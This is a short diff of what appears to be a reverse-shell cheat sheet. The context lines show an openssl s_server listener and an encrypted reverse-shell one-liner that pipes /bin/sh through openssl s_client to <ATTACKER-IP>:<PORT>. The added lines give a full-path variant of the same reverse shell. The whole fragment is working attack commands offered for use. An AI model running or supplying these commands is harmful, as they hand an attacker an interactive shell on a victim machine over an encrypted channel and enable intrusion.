@@ -12,8 +12,8 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;PORT&gt;<br/>
 # Reverse Shell:<br/>
 mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s<br/>
 <br/>
-<br/>
-<br/>
+# Full paths<br/>
+/usr/bin/mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | /usr/bin/openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s<br/>
 <br/>
 <br/>
 <br/>
